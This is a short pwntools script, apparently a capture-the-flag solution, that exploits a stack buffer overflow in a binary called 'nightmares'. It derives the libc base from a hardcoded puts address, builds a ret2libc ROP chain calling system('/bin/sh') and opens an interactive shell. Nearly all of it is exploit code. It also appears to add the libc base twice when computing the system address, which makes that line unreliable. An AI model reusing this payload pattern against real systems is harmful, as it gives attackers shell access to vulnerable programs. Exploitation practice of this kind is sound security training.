# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts"
# 235: 0000000000087bd0   550 FUNC    WEAK   DEFAULT   17 puts@@GLIBC_2.2.5
# 1050: 0000000000058740    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
# [ 1b42f]  /bin/sh     (readelf -p .rodata /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh")
# 1cb42f /bin/sh        (strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh")

'''p &puts
$6 = (int (*)(const char *)) 0x7ffff7e2cbd0 <__GI__IO_puts>
'''

from pwn import *

target = process("./bin/nightmares")
c = context.binary = ELF("./bin/nightmares", checksec=False)
rop = ROP(c)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

puts_leaked_addr = 0x7ffff7e2cbd0
libc.address = puts_leaked_addr - libc.sym["puts"]
log.info("LIBC address: %s" % hex(libc.address))
binsh_addr = next(libc.search(b"/bin/sh"))
log.info("binsh address: %s" % hex(binsh_addr))
system_addr = libc.address + libc.sym["system"]
log.info("system address: %s" % hex(system_addr))

pop_rsi_pop_rdi_pop_rbp_ret = 0x0000000000401294

buffer_size = 64
payload = buffer_size * b'A' + p64(pop_rsi_pop_rdi_pop_rbp_ret) + p64(0x0) + p64(binsh_addr) + p64(0x0) + p64(system_addr)

gdb.attach(target)

target.sendline(payload)
target.interactive()